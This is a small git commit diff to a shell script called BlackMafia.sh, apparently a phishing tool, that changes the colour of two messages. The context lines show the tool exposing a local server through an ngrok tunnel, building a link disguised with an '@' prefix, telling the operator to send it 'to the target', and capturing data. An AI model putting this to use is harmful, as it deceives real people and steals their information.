cd8c7a80fc95ec4651bfb1a7fa82e3ccf95207c3
lovehacker <61407838+lovehacker404@users.noreply.github.com>
2021-02-11 18:16:08 +0500

    Update BlackMafia.sh

--- BlackMafia.sh
+++ BlackMafia.sh
@@ -254,8 +254,8 @@ start_ngrok() {
 	{ sleep 8; clear; banner_mafia; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Send This link To The Target Orignal link: ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Send This link To The Target Edit link: ${GREEN}$mafia404@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Orignal link: ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Send This link To The Target Edit link: ${GREEN}$mafia404@$ngrok_url1"
 	capture_data
 }
 
